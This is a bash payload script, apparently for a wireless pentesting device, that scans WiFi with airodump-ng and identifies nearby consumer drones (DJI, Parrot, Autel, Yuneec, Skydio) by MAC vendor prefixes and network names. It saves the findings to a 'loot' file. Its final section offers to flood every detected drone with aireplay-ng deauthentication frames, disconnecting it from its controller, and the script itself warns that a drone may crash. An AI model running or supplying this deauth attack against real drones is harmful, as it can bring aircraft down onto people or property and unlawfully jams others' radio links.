#!/bin/bash
# Title: Drone Hunter
# Author: bad-antics
# Description: Detect and identify nearby drones by WiFi
# Category: nullsec/recon

DRONE_OUIS="60:60:1F:DJI
34:D2:62:DJI
48:1C:B9:DJI
60:B6:47:DJI
E0:49:4C:DJI
40:1C:A8:Parrot
90:03:B7:Parrot
A0:14:3D:Parrot
00:12:1C:Parrot
00:26:7E:Parrot
94:51:03:Autel
90:3A:E6:Autel
2C:41:A1:Yuneec
60:A4:4C:Skydio
9C:4E:36:Holy_Stone
A0:C9:A0:Syma
4C:49:E3:Autel"

DRONE_SSIDS="Spark-|Mavic-|Phantom|TELLO-|Anafi-|Bebop|PARROT|DJI|Skydio|YUNEEC|AUTEL"

PROMPT "DRONE HUNTER

Detect drones by their
WiFi signatures.

Identifies DJI, Parrot,
Autel, Yuneec, and more.

Press OK to configure."

# Use existing monitor interface
MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"; exit 1; }

DURATION=$(NUMBER_PICKER "Scan time (sec):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "START DRONE SCAN?

Interface: $MON_IF
Duration: ${DURATION}s

Press OK to scan.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Scanning for drones..."

TEMP_DIR="/tmp/dronehunt_$$"
mkdir -p "$TEMP_DIR"
rm -f /tmp/dronehunt_*
timeout "$DURATION" airodump-ng "$MON_IF" -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
sleep "$DURATION"
killall airodump-ng 2>/dev/null

SPINNER_STOP

LOOT_DIR="/mmc/nullsec/drones"
mkdir -p "$LOOT_DIR"
LOOT_FILE="$LOOT_DIR/drones_$(date +%Y%m%d_%H%M%S).txt"

echo "Drone Hunter Results" > "$LOOT_FILE"
echo "Date: $(date)" >> "$LOOT_FILE"
echo "Interface: $MON_IF" >> "$LOOT_FILE"
echo "Scan Duration: ${DURATION}s" >> "$LOOT_FILE"
echo "---" >> "$LOOT_FILE"

FOUND=0

if [ -f "$TEMP_DIR/scan-01.csv" ]; then
    while IFS=',' read -r BSSID F2 F3 CHANNEL F5 SPEED PRIVACY CIPHER AUTH POWER F11 F12 F13 ESSID REST; do
        BSSID=$(echo "$BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
        ESSID=$(echo "$ESSID" | sed 's/^[[:space:]]*//')

        [[ ! "$BSSID" =~ ^[0-9A-Fa-f]{2}: ]] && continue

        OUI=$(echo "$BSSID" | cut -d':' -f1-3)

        DRONE_TYPE=""
        MATCH=$(echo "$DRONE_OUIS" | grep -i "^$OUI" | head -1 | awk -F: '{print $4}')
        [ -n "$MATCH" ] && DRONE_TYPE="$MATCH"

        if [ -z "$DRONE_TYPE" ] && [ -n "$ESSID" ] && echo "$ESSID" | grep -qiE "$DRONE_SSIDS"; then
            if echo "$ESSID" | grep -qi "DJI\|Spark\|Mavic\|Phantom\|TELLO"; then
                DRONE_TYPE="DJI"
            elif echo "$ESSID" | grep -qi "Parrot\|Anafi\|Bebop"; then
                DRONE_TYPE="Parrot"
            elif echo "$ESSID" | grep -qi "AUTEL"; then
                DRONE_TYPE="Autel"
            elif echo "$ESSID" | grep -qi "YUNEEC"; then
                DRONE_TYPE="Yuneec"
            elif echo "$ESSID" | grep -qi "Skydio"; then
                DRONE_TYPE="Skydio"
            else
                DRONE_TYPE="Unknown_Drone"
            fi
        fi

        if [ -n "$DRONE_TYPE" ]; then
            echo "" >> "$LOOT_FILE"
            echo "DRONE DETECTED!" >> "$LOOT_FILE"
            echo "  Type: $DRONE_TYPE" >> "$LOOT_FILE"
            echo "  BSSID: $BSSID" >> "$LOOT_FILE"
            echo "  SSID: $ESSID" >> "$LOOT_FILE"
            echo "  Channel: $(echo $CHANNEL | tr -d ' ')" >> "$LOOT_FILE"
            echo "  Signal: $(echo $POWER | tr -d ' ') dBm" >> "$LOOT_FILE"
            FOUND=$((FOUND + 1))
        fi
    done < "$TEMP_DIR/scan-01.csv"
fi

rm -rf "$TEMP_DIR"

if [ "$FOUND" -gt 0 ]; then
    PROMPT "DRONES FOUND: $FOUND

Check $LOOT_FILE
for details.

Press OK to continue."

    resp=$(CONFIRMATION_DIALOG "DEAUTH DRONES?

Disconnect $FOUND drones
from controllers.

WARNING: Drone may crash!

Confirm?")

    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        LOG "Deauthing drones..."
        grep "BSSID:" "$LOOT_FILE" | sed 's/.*BSSID: //' | tr -d ' ' | while read DRONE_MAC; do
            [ -n "$DRONE_MAC" ] && timeout 15 aireplay-ng --deauth 50 -a "$DRONE_MAC" "$MON_IF" 2>/dev/null &
        done
        sleep 15
        killall aireplay-ng 2>/dev/null

        PROMPT "DEAUTH COMPLETE

All detected drones
have been targeted.

Press OK to exit."
    fi
else
    PROMPT "NO DRONES FOUND

No drone WiFi signals
detected in ${DURATION}s.

Try longer scan or
different location.

Press OK to exit."
fi
